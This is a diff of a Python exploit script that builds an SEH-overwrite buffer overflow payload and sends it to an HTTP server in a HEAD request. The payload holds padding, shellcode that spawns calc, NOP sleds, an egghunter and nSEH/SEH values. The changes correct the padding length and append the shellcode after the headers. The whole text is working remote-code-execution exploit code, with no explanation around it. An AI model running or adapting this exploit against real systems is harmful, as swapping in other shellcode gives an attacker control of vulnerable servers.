@@ -50,8 +50,8 @@ shellcode_calc += "\x09\x6b\x1b\x5e\x8a\x9e\xe3\xa5\x92\xea"
 shellcode_calc += "\xe6\xe2\x14\x06\x9a\x7b\xf1\x28\x09\x7b"
 shellcode_calc += "\xd0\x4a\xcc\xef\xb8\xa2\x6b\x88\x5b\xbb"
 
-exploit_payload  = "A" * (1569 - len(shellcode_calc) + shellcode_calc
-exploit_payload += "\xcc"*30 + egghunter
+exploit_payload  = "A" * (1507 - len(shellcode_calc)) + shellcode_calc
+exploit_payload += "\x90" * 10 + egghunter + "\x90" * 20
 exploit_payload += nseh
 exploit_payload += seh
 exploit_payload += "G" * 8000
@@ -60,6 +60,8 @@ http_request  = "HEAD /" + exploit_payload + " HTTP/1.1\r\n"
 http_request += "Host: \r\n"
 http_request += "User-Agent: firefox \r\n"
 http_request += "If-Modified-Since: Wed \r\n\r\n"
+http_request += shellcode_calc
+
 
 expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 
@@ -72,3 +74,4 @@ try:
 	print("[*] Watch for a spawned calc")
 except:
 	print("[!] Exploit failed to send")
+
